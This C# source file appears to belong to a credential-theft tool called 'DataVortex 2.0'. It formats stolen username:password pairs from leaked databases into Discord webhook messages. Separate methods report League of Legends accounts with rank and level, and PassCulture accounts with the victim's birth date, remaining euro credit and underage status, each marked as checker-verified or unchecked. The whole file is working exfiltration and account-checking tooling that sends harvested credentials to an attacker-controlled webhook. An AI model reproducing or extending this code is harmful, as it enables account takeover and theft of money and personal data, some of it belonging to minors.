using Discord;
using Discord.Webhook;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;

namespace AuthServer.DataVortex
{
    internal class WebHook
    {
        public static class Send
        {
            public static async Task SendToDiscordWebhookNoChecker(List<(string url, string username, string password, string app)> results, string webhookUrl, string fileName, string keyword)
            {
                using (var client = new DiscordWebhookClient(webhookUrl))
                {
                    string imageUrl = "https://media.discordapp.net/attachments/1267569930564272351/1273074475705041020/d_1.png?ex=66bd4a7f&is=66bbf8ff&hm=5924db606dc53d7c38095068e159b253aca09ebd5c9c61bdc8f889c5b1c21380&=&format=webp&quality=lossless&width=960&height=240";

                    var embed = new EmbedBuilder();
                    embed.WithTitle("");
                    embed.WithColor(new Discord.Color(241, 196, 15));

                    embed.AddField("<:um_item1:1269270979406856252> Database :", fileName);

                    var sb = new StringBuilder();
                    foreach (var result in results)
                    {
                        sb.AppendLine($"`{result.username}:{result.password}`");
                    }

                    embed.AddField("<:um_item1:1269270979406856252> Credentials :", sb.ToString());

                    // Afficher le mot clé utilisé pour la recherche
                    embed.AddField("<:um_item1:1269270979406856252> Keyword :", keyword);

                    // Afficher le champ Checked
                    embed.AddField("<:um_item1:1269270979406856252> Checked :", "NO :x:");
                    embed.AddField("<:warning:1245327728844996708> Info :", "Keyword does not have an Checker Config.");

                    embed.WithImageUrl(imageUrl);
                    embed.WithTimestamp(DateTimeOffset.Now);
                    embed.WithFooter("DataVortex 2.0");

                    await client.SendMessageAsync(embeds: new[] { embed.Build() });
                }
            }

            public static async Task SendToDiscordWebhookLeagueOfLegends(List<(string url, string username, string password, string app)> results, string fileName, string username, string level, string tier, string lp, string webhookUrl)
            {
                using (var client = new DiscordWebhookClient(webhookUrl))
                {
                    string imageUrl = "https://media.discordapp.net/attachments/1267569930564272351/1273074475705041020/d_1.png?ex=66bd4a7f&is=66bbf8ff&hm=5924db606dc53d7c38095068e159b253aca09ebd5c9c61bdc8f889c5b1c21380&=&format=webp&quality=lossless&width=960&height=240";

                    var embed = new EmbedBuilder();
                    embed.WithTitle("League of Legends Account");
                    embed.WithColor(new Discord.Color(52, 152, 219));

                    embed.AddField("<:um_item1:1269270979406856252> Database :", fileName);

                    var sb = new StringBuilder();
                    foreach (var result in results)
                    {
                        sb.AppendLine($"`{result.username}:{result.password}`");
                    }

                    embed.AddField("<:um_item1:1269270979406856252> Credentials [RIOT] :", sb.ToString());

                    embed.AddField("<:um_item1:1269270979406856252> Checked :", "YES :white_check_mark: ");

                    embed.AddField("<:4897teemo:1274081526035906712> Summoner Name :", username);
                    embed.AddField("<:lvl:1274081922938568785> Level :", level);

                    // Ajouter l'émoji spécifique en fonction du tier
                    string tierEmoji = tier switch
                    {
                        "BRONZE" => "<:1184bronze:1274071216944316477>",
                        "SILVER" => "<:7455silver:1274071220194771009>",
                        "GOLD" => "<:1053gold:1274071214788182067>",
                        "PLATINUM" => "<:3978platinum:1274071218320052306>",
                        "DIAMOND" => "<:1053diamond:1274071213324501092>",
                        "MASTER" => "<:9231master:1274071223004954634>",
                        "GRANDMASTER" => "<:9476grandmaster:1274071225894830123>",
                        "CHALLENGER" => "<:9476challenger:1274071224611242096>",
                        "IRON" => "<:7574iron:1274071221482426520>",
                        _ => ""
                    };

                    embed.AddField("Tier", $"{tierEmoji} {tier}");
                    embed.AddField("LP", lp);

                    embed.WithImageUrl(imageUrl);
                    embed.WithTimestamp(DateTimeOffset.Now);
                    embed.WithFooter("DataVortex 2.0");

                    await client.SendMessageAsync(embeds: new[] { embed.Build() });
                }
            }

            public static async Task SendToDiscordWebhookLeagueOfLegendsNonVerified(List<(string url, string username, string password, string app)> results, string webhookUrl, string fileName)
            {
                using (var client = new DiscordWebhookClient(webhookUrl))
                {
                    string imageUrl = "https://media.discordapp.net/attachments/1267569930564272351/1273074475705041020/d_1.png?ex=66bd4a7f&is=66bbf8ff&hm=5924db606dc53d7c38095068e159b253aca09ebd5c9c61bdc8f889c5b1c21380&=&format=webp&quality=lossless&width=960&height=240";

                    var embed = new EmbedBuilder();
                    embed.WithTitle("[Unchecked] League of Legends Account");
                    embed.WithColor(new Discord.Color(241, 196, 15));

                    embed.AddField("<:um_item1:1269270979406856252> Database :", fileName);

                    var sb = new StringBuilder();
                    foreach (var result in results)
                    {
                        sb.AppendLine($"`{result.username}:{result.password}`");
                    }

                    embed.AddField("<:um_item1:1269270979406856252> Credentials :", sb.ToString());

                    embed.AddField("<:warning:1245327728844996708> Info :", "Account can't be verified.");

                    embed.WithImageUrl(imageUrl);
                    embed.WithTimestamp(DateTimeOffset.Now);
                    embed.WithFooter("DataVortex 2.0");

                    await client.SendMessageAsync(embeds: new[] { embed.Build() });
                }
            }

            public static async Task SendToDiscordWebhookPassCulture(List<(string url, string username, string password, string app)> results, string webhookUrl, string fileName, bool isUnderage, double? remainingCreditInEuros)
            {
                using (var client = new DiscordWebhookClient(webhookUrl))
                {
                    string imageUrl = "https://media.discordapp.net/attachments/1267569930564272351/1273074475705041020/d_1.png?ex=66bd4a7f&is=66bbf8ff&hm=5924db606dc53d7c38095068e159b253aca09ebd5c9c61bdc8f889c5b1c21380&=&format=webp&quality=lossless&width=960&height=240";

                    var embed = new EmbedBuilder();
                    embed.WithTitle("PassCulture Account");
                    embed.WithColor(new Discord.Color(52, 152, 219));

                    embed.AddField("<:um_item1:1269270979406856252> Database :", fileName);

                    var sb = new StringBuilder();
                    foreach (var result in results)
                    {
                        sb.AppendLine($"`{result.username}:{result.password}`");
                    }

                    embed.AddField("<:um_item1:1269270979406856252> Credentials :", sb.ToString());

                    // Ajoutez le champ Checked
                    embed.AddField("<:um_item1:1269270979406856252> Checked :", DataVortex.Checker.IsVerified ? "YES :white_check_mark:" : "NO :x:");

                    // Si le compte est vérifié, ajoutez la date de naissance et le crédit de domaine restant
                    if (DataVortex.Checker.IsVerified)
                    {
                        embed.AddField("<:calendar_spiral:1245327728844996708> Date of Birth :", DataVortex.Checker.BirthDate);
                        embed.AddField("<:euro:1245327728844996708> Remaining domain credit :", $"{DataVortex.Checker.RemainingCreditInEuros}€");

                        // Ajouter le message d'éligibilité
                        if (isUnderage)
                        {
                            embed.AddField("<:3139_Xbox:1273426388086689833> Xbox Game Pass :", "Not Available");
                        }
                        else
                        {
                            embed.AddField("<:3139_Xbox:1273426388086689833> Xbox Game Pass :", "Available");
                        }
                    }
  
                    embed.WithImageUrl(imageUrl);
                    embed.WithTimestamp(DateTimeOffset.Now);
                    embed.WithFooter("DataVortex 2.0");

                    await client.SendMessageAsync(embeds: new[] { embed.Build() });
                }
            }

            public static async Task SendToDiscordWebhookPassCultureNonVerified(List<(string url, string username, string password, string app)> results, string webhookUrl, string fileName)
            {
                using (var client = new DiscordWebhookClient(webhookUrl))
                {
                    string imageUrl = "https://media.discordapp.net/attachments/1204398362384928880/1245358475073163264/d.png?ex=665875f6&is=66572476&hm=7a72c19c666fa7d0e25782a5fbf2065be80edee5046a83fbaae11b4b9a50a3fehttps://media.discordapp.net/attachments/1267569930564272351/1273074475705041020/d_1.png?ex=66bd4a7f&is=66bbf8ff&hm=5924db606dc53d7c38095068e159b253aca09ebd5c9c61bdc8f889c5b1c21380&=&format=webp&quality=lossless&width=960&height=240";

                    var embed = new EmbedBuilder();
                    embed.WithTitle("[Unchecked] PassCulture Account");
                    embed.WithColor(new Discord.Color(231, 76, 60)); // Couleur rouge pour indiquer que le compte n'est pas vérifié

                    embed.AddField("<:um_item1:1269270979406856252> Database :", fileName);

                    var sb = new StringBuilder();
                    foreach (var result in results)
                    {
                        sb.AppendLine($"`{result.username}:{result.password}`");
                    }

                    embed.AddField("<:um_item1:1269270979406856252> Credentials :", sb.ToString());

                    // Ajoutez une ligne pour indiquer que le compte n'a pas été vérifié
                    embed.AddField("<:warning:1245327728844996708> Info :", "Account can't be verified.");

                    embed.WithImageUrl(imageUrl);
                    embed.WithTimestamp(DateTimeOffset.Now);
                    embed.WithFooter("DataVortex 2.0");

                    await client.SendMessageAsync(embeds: new[] { embed.Build() });
                }
            }
        }
    }
}
